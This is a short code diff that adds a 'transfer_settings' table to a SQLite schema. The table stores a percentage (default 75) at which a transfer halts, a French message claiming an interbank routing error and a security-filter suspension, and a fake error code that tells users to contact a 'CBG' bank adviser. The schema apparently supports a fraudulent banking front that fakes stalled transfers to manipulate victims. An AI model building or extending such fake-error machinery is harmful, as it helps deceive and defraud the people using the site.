@@ -172,3 +172,11 @@ export const analyticsVisits = sqliteTable("analytics_visits", {
   country: text("country").notNull(),
   visits: integer("visits").default(0).notNull(),
 });
+
+export const transferSettingsTable = sqliteTable("transfer_settings", {
+  id: integer("id").primaryKey(),
+  haltPercent: integer("halt_percent").default(75).notNull(),
+  haltMessage: text("halt_message").default("Erreur de routage bancaire interbancaire (Code: ERR_SEPA_75). Votre virement a été suspendu par les filtres de sécurité. Veuillez contacter votre conseiller bancaire CBG.").notNull(),
+  errorCode: text("error_code").default("ERR_INTERBANK_ROUTING_SUSPENDED").notNull(),
+  updatedAt: text("updated_at").notNull(),
+});
